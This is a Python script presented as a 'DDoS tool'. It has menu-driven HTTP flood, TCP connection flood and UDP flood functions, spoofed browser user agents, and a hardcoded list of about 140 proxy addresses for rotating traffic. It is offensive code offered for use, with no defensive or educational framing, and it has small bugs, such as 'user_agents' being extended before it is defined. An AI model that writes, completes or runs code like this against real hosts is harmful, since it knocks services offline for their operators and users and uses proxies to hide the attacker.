import threading
import socket
import random
import sys
import time
import requests
from urllib.parse import urlparse
import os

# --- Colors ---
# Reset
C_RESET = '\033[0m'

# Regular Colors
C_BLACK   = '\033[30m'
C_RED     = '\033[31m'
C_GREEN   = '\033[32m'
C_YELLOW  = '\033[33m'
C_BLUE    = '\033[34m'
C_MAGENTA = '\033[35m'
C_CYAN    = '\033[36m'
C_WHITE   = '\033[37m'

# Bright (Premium Look)
C_BRED     = '\033[91m'
C_BGREEN   = '\033[92m'
C_BYELLOW  = '\033[93m'
C_BBLUE    = '\033[94m'
C_BMAGENTA = '\033[95m'
C_BCYAN    = '\033[96m'
C_BWHITE   = '\033[97m'

# Styles (Premium UI feel)
C_BOLD      = '\033[1m'
C_DIM       = '\033[2m'
C_ITALIC    = '\033[3m'
C_UNDERLINE = '\033[4m'
C_BLINK     = '\033[5m'
C_REVERSE   = '\033[7m'

# Background Colors
C_BG_RED     = '\033[41m'
C_BG_GREEN   = '\033[42m'
C_BG_YELLOW  = '\033[43m'
C_BG_BLUE    = '\033[44m'
C_BG_MAGENTA = '\033[45m'
C_BG_CYAN    = '\033[46m'
C_BG_WHITE   = '\033[47m'

# --- General Settings ---
user_agents += [

# --- Windows Chrome (20) ---
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.6099.110 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.6099.199 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.6167.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.6167.160 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.6261.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.6261.128 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/120.0.6099.144 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/121.0.6167.140 Safari/537.36",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.6261.111 Safari/537.36",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.6312.86 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.6312.58 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.6312.122 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.91 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.155 Safari/537.36",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.6367.78 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.6045.200 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.5993.120 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.5414.120 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/110.0.5481.177 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.5938.150 Safari/537.36",

# --- Edge (10) ---
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.2210.91",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.2277.83",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Edge/122.0.2365.92",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Edge/123.0.2420.65",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/124.0.2478.67",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Edge/120.0.2210.121",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Edge/122.0.2365.80",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.2277.128",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/123.0.2420.53",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Edge/124.0.2478.51",

# --- Firefox (10) ---
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:124.0) Gecko/20100101 Firefox/124.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:118.0) Gecko/20100101 Firefox/118.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
"Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",

# --- macOS (10) ---
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/121.0.6167.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 Chrome/122.0.6261.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 Chrome/123.0.6312.86 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 Chrome/124.0.6367.91 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 Version/16.5 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7) AppleWebKit/605.1.15 Version/15.6 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.1 Safari/605.1.15",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/120.0.6099.110 Safari/537.36",

# --- Android (20) ---
"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 Chrome/121.0.6167.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/123.0.6312.80 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Poco X3 Pro) AppleWebKit/537.36 Chrome/120.0.6099.193 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 Chrome/121.0.6167.165 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 14; OnePlus 11) AppleWebKit/537.36 Chrome/122.0.6261.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/119.0.6045.194 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A725F) AppleWebKit/537.36 Chrome/121.0.6167.140 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/118.0.5993.120 Mobile Safari/537.36",

# --- iPhone (10) ---
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 Version/15.7 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 Version/14.8 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Version/17.1 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 Version/15.6 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 Version/14.7 Mobile Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 Version/13.7 Mobile Safari/604.1"

]

proxies = [
"45.159.218.47:80",
"198.177.56.175:80",
"104.19.27.14:80",
"27.189.129.180:8089",
"172.67.177.202:80",
"104.17.127.80:80",
"162.159.248.218:80",
"104.18.63.182:80",
"154.30.242.3:9397",
"54.199.199.66:3128",
"156.248.92.238:6500",
"74.119.147.209:4145",
"45.131.6.37:80",
"218.97.194.94:80",
"116.58.232.166:4145",
"103.37.111.253:18081",
"119.18.151.198:2626",
"168.194.221.52:4153",
"94.26.223.30:8080",
"36.91.87.143:8080",
"15.168.235.57:14569",
"35.181.173.74:5671",
"190.7.230.230:8080",
"5.134.48.59:8080",
"191.97.14.189:999",
"16.79.112.218:8085",
"116.254.118.180:80",
"113.176.92.71:3128",
"116.68.115.74:8080",
"168.126.66.19:3128",
"141.101.122.235:80",
"172.67.134.82:80",
"23.227.38.124:80",
"103.21.244.211:80",
"103.21.244.176:80",
"185.199.229.156:7492",
"185.199.228.220:7300",
"185.199.231.45:8382",
"188.74.210.207:6286",
"188.74.183.10:8279",
"188.74.210.21:6100",
"45.155.68.129:8133",
"45.155.68.64:8133",
"45.155.68.12:8133",
"45.155.68.91:8133",
"45.155.68.142:8133",
"103.152.112.162:80",
"103.152.112.145:80",
"103.152.112.120:80",
"103.152.112.157:80",
"103.152.112.99:80",
"51.158.68.68:8811",
"51.158.68.26:8811",
"51.158.123.35:8811",
"163.172.31.44:80",
"163.172.33.137:80",
"163.172.182.164:80",
"51.159.115.233:3128",
"51.159.115.171:3128",
"51.159.115.94:3128",
"51.159.115.186:3128",
"8.219.97.248:80",
"8.213.128.90:8008",
"8.213.137.155:8080",
"8.210.83.33:80",
"47.243.50.83:8080",
"47.74.152.29:8888",
"47.91.121.127:3128",
"47.245.34.161:8080",
"103.83.232.122:80",
"103.83.232.201:80",
"103.83.232.45:80",
"103.83.232.90:80",
"103.83.232.178:80",
"91.121.177.31:3128",
"91.121.177.30:3128",
"91.121.177.29:3128",
"91.121.177.28:3128",
"91.121.177.27:3128",
"178.62.193.19:3128",
"178.62.193.20:3128",
"178.62.193.21:3128",
"178.62.193.22:3128",
"178.62.193.23:3128",
"64.225.8.82:9981",
"64.225.4.17:9991",
"64.225.8.140:9988",
"64.225.8.191:9980",
"64.225.8.115:9999",
"134.209.29.120:3128",
"134.209.29.121:3128",
"134.209.29.122:3128",
"134.209.29.123:3128",
"134.209.29.124:3128",
"159.89.49.210:3128",
"159.89.49.211:3128",
"159.89.49.212:3128",
"159.89.49.213:3128",
"159.89.49.214:3128",
"138.68.60.8:8080",
"138.68.60.9:8080",
"138.68.60.10:8080",
"138.68.60.11:8080",
"138.68.60.12:8080",
"167.99.174.59:80",
"167.99.174.60:80",
"167.99.174.61:80",
"167.99.174.62:80",
"167.99.174.63:80",
"45.77.55.55:8080",
"45.77.55.56:8080",
"45.77.55.57:8080",
"45.77.55.58:8080",
"45.77.55.59:8080",
"66.42.50.10:8080",
"66.42.50.11:8080",
"66.42.50.12:8080",
"66.42.50.13:8080",
"66.42.50.14:8080",
"192.241.135.10:3128",
"192.241.135.11:3128",
"192.241.135.12:3128",
"192.241.135.13:3128",
"192.241.135.14:3128",
"104.248.63.15:30588",
"104.248.63.16:30588",
"104.248.63.17:30588",
"104.248.63.18:30588",
"104.248.63.19:30588",
"139.59.1.14:8080",
"139.59.1.15:8080",
"139.59.1.16:8080",
"139.59.1.17:8080",
"139.59.1.18:8080"
]

# --- ASCII Banner ---
banner = f"""
{C_BOLD}{C_BCYAN}
   ██████╗ ███████╗██╗     ██╗ ██████╗ ██╗     
  ██╔════╝ ██╔════╝██║     ██║██╔═══██╗██║     
  ██║  ███╗█████╗  ██║     ██║██║   ██║██║     
  ██║   ██║██╔══╝  ██║     ██║██║   ██║██║     
  ╚██████╔╝███████╗███████╗██║╚██████╔╝███████╗
   ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚══════╝
{C_RESET}

{C_BOLD}{C_BGREEN}            >>> CELIO DDOS TOOL <<< {C_RESET}
{C_BYELLOW}            Version : 2.0 | Status : ACTIVE{C_RESET}
"""


# --- Layer 7 Attack Functions ---
def load_proxies():
    """Loads the proxy list from proxies.txt."""
    try:
        with open('proxies.txt', 'r') as f:
            proxies.extend(f.read().strip().split('\n'))
        if not proxies:
            print(f"{C_YELLOW}[Warning] proxies.txt is empty or not found. Attack will continue without proxies.{C_RESET}")
    except IOError:
        print(f"{C_YELLOW}[Warning] proxies.txt not found. Attack will continue without proxies.{C_RESET}")

def http_flood_attack(target_url, end_time):
    """Performs an advanced HTTP Flood attack."""
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': f'https://www.google.com/search?q={random.randint(1, 1000)}',
                'Connection': 'keep-alive',
            }
            # Add a random query parameter to the URL to bypass cache
            attack_url = f"{target_url}?{random.randint(1, 100000)}={random.randint(1, 100000)}"
            
            # Use a proxy if available
            proxy = {'http': f'http://{random.choice(proxies)}', 'https': f'https://{random.choice(proxies)}'} if proxies else None
            
            requests.get(attack_url, headers=headers, timeout=5, proxies=proxy)
        except (requests.exceptions.RequestException, ConnectionError):
            pass

# --- Layer 4 Attack Functions ---
def tcp_syn_flood(target_ip, target_port, end_time):
    """Performs a TCP SYN Flood attack."""
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Leave the connection half-open without closing it immediately
        except socket.error:
            pass
        finally:
            s.close()

def udp_flood(target_ip, target_port, end_time):
    """Performs a UDP Flood attack."""
    packet_size = 1024 # 1 KB packets
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            packet = random._urandom(packet_size)
            udp_socket.sendto(packet, (target_ip, target_port))
        except socket.error:
            pass

# --- Main Menu and Management ---
def main_menu():
    print(banner)
    print(f"{C_CYAN}╔═════════════════════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║           CELIO ATTACK v1.0             ║{C_RESET}")
    print(f"{C_CYAN}╠═════════════════════════════════════════╣{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}1. Layer 7 (Application) Attacks        {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}2. Layer 4 (Network) Attacks            {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════════════════════╝{C_RESET}")
    choice = input(f"{C_YELLOW}Your choice -> {C_RESET}")

    if choice == '1':
        layer7_menu()
    elif choice == '2':
        layer4_menu()
    else:
        print(f"{C_RED}Invalid choice.{C_RESET}")
        sys.exit()

def layer7_menu():
    print(f"\n{C_CYAN}╔═════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║     Layer 7 Attacks     ║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════╝{C_RESET}")
    target_url = input(f"{C_YELLOW}Target URL (e.g., http://example.com) -> {C_RESET}")
    if not urlparse(target_url).scheme:
        print(f"\n{C_RED}Error: Please enter a valid URL.{C_RESET}")
        return
    num_threads = int(input(f"{C_YELLOW}Number of Threads (e.g., 500) -> {C_RESET}"))
    attack_duration = int(input(f"{C_YELLOW}Attack Duration (seconds) -> {C_RESET}"))
    
    load_proxies()
    
    print(f"\n{C_GREEN}[L7] Starting HTTP Flood attack...{C_RESET}")
    run_attack(http_flood_attack, (target_url, time.time() + attack_duration), num_threads, attack_duration)

def layer4_menu():
    print(f"\n{C_CYAN}╔═════════════════════════╗{C_RESET}")
    print(f"{C_CYAN}║     Layer 4 Attacks     ║{C_RESET}")
    print(f"{C_CYAN}╠═════════════════════════╣{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}1. TCP SYN Flood        {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}║ {C_WHITE}2. UDP Flood            {C_CYAN}║{C_RESET}")
    print(f"{C_CYAN}╚═════════════════════════╝{C_RESET}")
    choice = input(f"{C_YELLOW}Attack Method -> {C_RESET}")
    
    target_ip = input(f"{C_YELLOW}Target IP Address -> {C_RESET}")
    target_port = int(input(f"{C_YELLOW}Target Port -> {C_RESET}"))
    num_threads = int(input(f"{C_YELLOW}Number of Threads (e.g., 500) -> {C_RESET}"))
    attack_duration = int(input(f"{C_YELLOW}Attack Duration (seconds) -> {C_RESET}"))
    
    end_time = time.time() + attack_duration
    if choice == '1':
        print(f"\n{C_GREEN}[L4] Starting TCP SYN Flood attack...{C_RESET}")
        run_attack(tcp_syn_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    elif choice == '2':
        print(f"\n{C_GREEN}[L4] Starting UDP Flood attack...{C_RESET}")
        run_attack(udp_flood, (target_ip, target_port, end_time), num_threads, attack_duration)
    else:
        print(f"{C_RED}Invalid choice.{C_RESET}")

def run_attack(attack_func, args, num_threads, attack_duration):
    print(f"{C_YELLOW}======================================{C_RESET}")
    print(f"{C_GREEN}Target: {C_WHITE}{args[0]}{C_RESET}")
    print(f"{C_GREEN}Threads: {C_WHITE}{num_threads}{C_RESET}")
    print(f"{C_GREEN}Duration: {C_WHITE}{attack_duration} seconds{C_RESET}")
    print(f"{C_YELLOW}======================================{C_RESET}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_func, args=args)
        thread.daemon = True
        threads.append(thread)
        thread.start()

    time.sleep(attack_duration)
    print(f"\n{C_GREEN}Attack finished.{C_RESET}")

if __name__ == "__main__":
    os.system("") # Enable ANSI colors on Windows
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{C_RED}Attack stopped by user.{C_RESET}")
        sys.exit()
    except (ValueError, IndexError):
        print(f"\n{C_RED}Error: Please enter a valid value.{C_RESET}")
    except Exception as e:
        print(f"\n{C_RED}An unexpected error occurred: {e}{C_RESET}")
